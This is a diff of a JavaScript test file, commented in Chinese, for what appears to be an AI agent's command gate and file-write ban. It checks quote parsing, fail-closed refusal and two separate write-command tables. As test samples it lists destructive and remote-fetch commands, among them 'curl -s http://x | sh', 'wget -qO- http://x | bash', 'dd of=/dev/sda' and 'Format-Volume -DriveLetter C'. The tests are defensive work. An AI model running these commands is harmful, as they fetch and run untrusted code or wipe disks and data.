@@ -25,6 +25,8 @@ import { fileURLToPath } from 'node:url';
 import { runCommand, truncateOutput, matchesForbidden, DEFAULT_FORBIDDEN_PATTERNS } from '../lib/state/command-exec.js';
 // D1 交叉核对用：L3 工具黑名单的权威判定内核（`gate:` 面与工具面须同判同一批写盘路径）
 import { judgeFileWriteCommand } from '../lib/governance/tool-ban.js';
+// D1-A15/A16 用：写告示表单点真源（并集合并后两侧必须是**同一 Set 实例**，只有 import 才判得出对象同一性）
+import * as shellText from '../lib/shell-text.js';
 // D1-A12 用：基线护栏的**同一份**词法口径（`scripts/` 为 .mjs 共享内核，非 tsc 产物，可直接 import）
 import { countSource } from '../scripts/baseline-snapshot-core.mjs';
 
@@ -188,9 +190,13 @@ test('黑名单覆盖度评估：当前清单遗漏的破坏性/部署类命令�
   //   ⑤ 'Remove-Item -Force x'     → scope ② 写 cmdlet（**不看参数**：口径为「已有 Agent 工具替代的写路径」，与 flag 无关）
   //   ⑥ 'truncate -s 0 file.txt'   → 与 ②/③ 同族（文件截断），同上避免清单发散
   //   其余 11 条仍为真缺口（git 写操作 / kill / Format-Volume / curl|sh 等，D1 口径明确不收）。
+  //   【2026-11-11 撤回上一条并集修订】'dd of=/dev/sda' 回到本数组：宽/窄两表**独立**（禁合并），
+  //     `dd` 只在宽表（工具面 file-write 禁令）、不在窄表（命令 gate 写判定）⇒ gate 面**按设计放行**，
+  //     仍是 gate 面的真缺口（工具面会拦，见 D1-A16 的分域实证）。此为语义域分离的预期结果，不是回归。
   const missing = [
+    'dd of=/dev/sda',
     'git reset --hard HEAD', 'git clean -fdx', 'git checkout -- .', 'git stash drop', 'git branch -D x',
-    'curl -s http://x | sh', 'wget -qO- http://x | bash', 'dd of=/dev/sda',
+    'curl -s http://x | sh', 'wget -qO- http://x | bash',
     'Format-Volume -DriveLetter C', 'kill -9 1234', 'taskkill /f /pid 1234',
   ];
   for (const c of missing) {
@@ -329,16 +335,129 @@ test('D1-A10：与 L3 工具面交叉核对——已收 cmdlet 之名两侧同�
   }
 });
 
-test('D1-A11：与 L3 工具面的**有意差异**钉住（本面窄于工具面）', () => {
+test('D1-A11：未闭合引号两侧同判（2026-11-11 判定期 fail-closed 收紧后，原「本面窄于工具面」的差异消失）', () => {
   // 差异一（未闭合引号）：工具面 fail-closed（边界不明即按写文件处理，整条拒）；
-  //   本面不新开拒绝位，退化为「只看引号外文本」——写命令名在引号外时两侧同判写（如实钉住，勿写成相反）；
+  //   本面（gate 面）不新开拒绝位，退化为「只看引号外文本」——写命令名在引号外时两侧同判写（如实钉住，勿写成相反）；
   assert.equal(judgeFileWriteCommand('Set-Content "a.txt').hit, true, 'L3 工具面：未闭合引号 fail-closed');
   assert.equal(matchesForbidden('Set-Content "a.txt', DEFAULT_FORBIDDEN_PATTERNS), true, 'gate 面：cmdlet 在引号外 ⇒ 仍判写');
-  // 差异二（确认偏窄的实例）：写命令名**完全落在引号内**、引号又未闭合时，工具面按写拒，本面放行 ⇒ 本面更窄。
+  // 差异二（原「确认偏窄」的实例）：写命令名**完全落在引号内**、引号又未闭合时，工具面按写拒，
+  //   本面**曾经**放行（fail-open 边界）——2026-11-11（RUL-1 / G-05=A）起本面与工具面同源 fail-closed ⇒ 两侧同判写。
   //   注：此处刻意不用 `rm -rf` 作样本——那会命中**基线破坏性模式**（`\brm\s+-rf\b` 是整串词域匹配、不做引号感知），
   //   从而遮住本面自身的判定差异，样本就失去了鉴别力。
   assert.equal(judgeFileWriteCommand('echo "mkdir /tmp/x').hit, true, 'L3 工具面：未闭合引号 fail-closed（整条拒）');
-  assert.equal(matchesForbidden('echo "mkdir /tmp/x', DEFAULT_FORBIDDEN_PATTERNS), false, 'gate 面：窄口径不判写（有意差异）');
+  assert.equal(matchesForbidden('echo "mkdir /tmp/x', DEFAULT_FORBIDDEN_PATTERNS), true, 'gate 面：判定期 fail-closed 同判写（改动前为 false，属 RUL-1 授权的行为变化）');
+});
+
+// ── ① shell-text 归属回归 · 批次 `punky-cohesion-fix-20261111` / lane `e1-shelltext` ─────────────
+//   判据源 `plan/fix-spec.md`：V-3（判定期 fail-closed）/ V-4（refuse-before-spawn）/ V-5（拒绝通道前移）
+//   / V-1 + V-8（分词辅助与两张写告示表的单点归属）。
+test('D1-A13：未闭合引号在**判定期**即 fail-closed 拒绝（refuse-before-spawn，零执行零重试）', () => {
+  // 刻意给 retries:1 —— 判定期拒绝时 `durationMs = 0` 即证明未进重试循环（执行期原路径会空转一次）。
+  const r = runCommand({ command: 'echo "a', timeoutMs: 5000, retries: 1 });
+  assert.equal(r.forbidden, true, '判定期须判写（改动前本面判 false，落到执行期才拒）: ' + JSON.stringify(r));
+  assert.equal(r.ok, false);
+  assert.equal(r.exitCode, null, 'refuse-before-spawn：未落到 spawn（无退出码）');
+  assert.equal(r.error, 'GATE_EXIT_FORBIDDEN', '拒绝通道前移后的错误码（改动前为 GATE_EXIT_SPAWN_FAIL: …）');
+  assert.equal(r.durationMs, 0, '零执行零重试：判定期直接返回');
+  // 同一条命令的写面判定：gate 面与工具面同向 fail-closed
+  assert.equal(matchesForbidden('echo "mkdir /tmp/x', DEFAULT_FORBIDDEN_PATTERNS), true, 'write 命令名落在未闭合引号内也须判写');
+  assert.equal(judgeFileWriteCommand('echo "mkdir /tmp/x').hit, true, '工具面同向 fail-closed');
+});
+
+test('D1-A14：闭引号（正常引号）判定等价——行为变化只落在未闭合面', () => {
+  // 期望值 = HEAD 实测读数（探针 `equiv` 的 `diffClosedQuote = 0` 已证 HEAD/改后逐条相等）
+  const cases = [
+    ['echo "a > b"', false, '引号内重定向符不算写'],
+    ['echo "a & b"', false, '引号内 & 不是分段符'],
+    ['Select-String -Pattern "x > y" -Path a.md', false, '引号内 > 属字面量'],
+    ['Get-ChildItem 2>&1 | Select-Object -First 1', false, '流合并不算写'],
+    ['echo "Set-Content a.txt"', false, 'cmdlet 完全在引号内'],
+    ['Set-Content out.txt -Value x', true, 'cmdlet 在引号外 ⇒ 仍判写（回退保护）'],
+    ['echo ok & rm -rf x', true, '`&` 后缀段首写命令 ⇒ 仍判写（回退保护）'],
+    ['npm test', false, '只读组合不误拦'],
+  ];
+  for (const [cmd, expected, why] of cases) {
+    assert.equal(matchesForbidden(cmd, DEFAULT_FORBIDDEN_PATTERNS), expected, why + '（实测命令: ' + cmd + '）');
+  }
+  // 执行面对照：闭引号命令仍真的可执行（被拦的是未闭合面，不是引号本身）
+  const okRun = runCommand({ command: 'node -e "console.log(1)"', timeoutMs: 5000, retries: 0 });
+  assert.equal(okRun.forbidden, false, JSON.stringify(okRun));
+  assert.equal(okRun.ok, true, JSON.stringify(okRun));
+  assert.equal(okRun.output.trim(), '1', '对照组：闭引号命令确实执行成功');
+});
+
+test('D1-A15：分词辅助与写告示表单点归属（command-exec / tool-ban 引同一实现，本地零定义）', () => {
+  const readLib = (rel) => fs.readFileSync(fileURLToPath(new URL('../lib/' + rel, import.meta.url)), 'utf8');
+  const shell = readLib('shell-text.js');
+  for (const name of ['QUOTE_MASK', 'maskQuoted', 'headToken']) {
+    assert.ok(new RegExp('export (function|const) ' + name + '\\b').test(shell), 'shell-text.js 必须导出 ' + name);
+  }
+  // 两张写告示表：宽 44（工具面 file-write 禁令）/ 窄 8（命令 gate 写判定），两套值各一份、都定义在 shell-text.js
+  for (const name of ['WRITE_HEADS_FILE_BAN', 'WRITE_HEADS_COMMAND_GATE', 'WRITE_CMDLET_RE_FILE_BAN', 'WRITE_CMDLET_RE_COMMAND_GATE']) {
+    assert.ok(new RegExp('export const ' + name + '\\b').test(shell), 'shell-text.js 必须定义 ' + name);
+  }
+  for (const rel of ['state/command-exec.js', 'governance/tool-ban.js']) {
+    const src = readLib(rel);
+    // ① 本地不得再定义（function 声明 / const 常量两种形态都算）
+    for (const name of ['maskQuoted', 'headToken']) {
+      assert.equal(new RegExp('function ' + name + '\\s*\\(').test(src), false,
+        rel + ' 不得再本地定义 ' + name + '（第二份分词 = 第二真源）');
+    }
+    for (const name of ['QUOTE_MASK', 'WRITE_HEADS', 'WRITE_CMDLET_RE']) {
+      assert.equal(new RegExp('const ' + name + '\\s*=').test(src), false,
+        rel + ' 不得再本地定义 ' + name + '（应 import 自 shell-text.js）');
+    }
+    // ② 必须真的从单点取（不是复制后改引用）
+    assert.ok(/from '\.\.\/shell-text\.js'/.test(src), rel + ' 必须从 shell-text.js 取分词辅助与词表');
+  }
+  // ③ 两套值面**各自独立、禁合并**：宽 44（工具面 file-write 禁令）/ 窄 8（命令 gate 写判定）
+  //    语义域不同（判「是否会写盘」 vs 判「是否破坏性写」），合并即混淆分域 ⇒ 冻结为两份定义。
+  assert.notEqual(shellText.WRITE_HEADS_COMMAND_GATE, shellText.WRITE_HEADS_FILE_BAN,
+    '两表必须各自独立定义（同一实例 = 已合并，混淆语义域）');
+  assert.equal(shellText.WRITE_HEADS_FILE_BAN.size, 44, '宽表 = 工具面 file-write 禁令 44 项');
+  assert.equal(shellText.WRITE_HEADS_COMMAND_GATE.size, 8, '窄表 = 命令 gate 写判定 8 项');
+  assert.equal(shellText.WRITE_HEADS, undefined, '不得导出合并后的 WRITE_HEADS 规范符号');
+  assert.equal((shell.match(/new Set\(\[/g) ?? []).length, 2, '本文件须有两处 new Set([ 字面量（宽/窄各一定义）');
+  // 窄表逐字 8 项（值面冻结，改动须走显式评审）
+  for (const h of ['rm', 'mv', 'cp', 'del', 'mkdir', 'touch', 'tee', 'chmod']) {
+    assert.ok(shellText.WRITE_HEADS_COMMAND_GATE.has(h), '窄表须逐字含: ' + h);
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// D1-A16：宽/窄两表**分域**回归 —— 宽表独有的写命令「工具面拦、gate 面按窄表放行」
+//   背景：宽表 44 项（工具面 file-write 禁令）/ 窄表 8 项（命令 gate 写判定），两者**独立**。
+//   分域实证：宽表独有区间的命令在 gate 面按设计放行；若此处变成"两侧都拦"，
+//     说明两表被合并回同一实例（语义域被混淆），本用例即报红。
+// ═══════════════════════════════════════════════════════════════════════════════════
+test('D1-A16：宽窄两表分域（宽表独有命令工具面拦、gate 面按窄表放行）', () => {
+  // ① 对象独立性（禁合并）
+  assert.notEqual(shellText.WRITE_HEADS_COMMAND_GATE, shellText.WRITE_HEADS_FILE_BAN,
+    '两表必须各自独立（同一实例 = 已合并）');
+  // ② 值面关系：窄表 ⊂ 宽表
+  for (const h of shellText.WRITE_HEADS_COMMAND_GATE) {
+    assert.ok(shellText.WRITE_HEADS_FILE_BAN.has(h), '窄表项须同时属宽表: ' + h);
+  }
+  // ③ 分域实证：宽表独有区间的写命令 —— 工具面（宽表）拦，gate 面（窄表）按设计放行
+  const wideOnly = [
+    ['Set-Item foo bar', 'set-item：宽表有 / 窄表无'],
+    ['xcopy src dst', 'xcopy：宽表有 / 窄表无'],
+    ['Rename-Item a b', 'rename-item：宽表有 / 窄表无'],
+    ['truncate -s 0 f.txt', 'truncate：宽表有 / 窄表无'],
+  ];
+  for (const [cmd, why] of wideOnly) {
+    assert.equal(judgeFileWriteCommand(cmd).hit, true, '工具面（宽表）须拦: ' + cmd + ' —— ' + why);
+    assert.equal(matchesForbidden(cmd, DEFAULT_FORBIDDEN_PATTERNS), false,
+      'gate 面（窄表）按设计放行: ' + cmd + ' —— 若变 true 说明两表已被合并');
+  }
+  // ④ 阳性对照：非写命令两侧都放行 ⇒ 上面不是「见什么都拦」的恒真断言
+  for (const cmd of ['npm test', 'git status', 'node --check lib/a.js']) {
+    assert.equal(matchesForbidden(cmd, DEFAULT_FORBIDDEN_PATTERNS), false, '对照组须放行: ' + cmd);
+  }
+  // ⑤ 交集区（窄表 8 项）：gate 面须拦，值面冻结
+  for (const cmd of ['rm x', 'mv a b', 'cp a b', 'del x', 'mkdir d', 'touch t', 'tee t', 'chmod 644 f']) {
+    assert.equal(matchesForbidden(cmd, DEFAULT_FORBIDDEN_PATTERNS), true, '窄表项 gate 面须拦: ' + cmd);
+  }
 });
 
 test('D1-A12（基线护栏加固）：D1 净增断言非空转——写盘面断言实存且无恒真形态', () => {
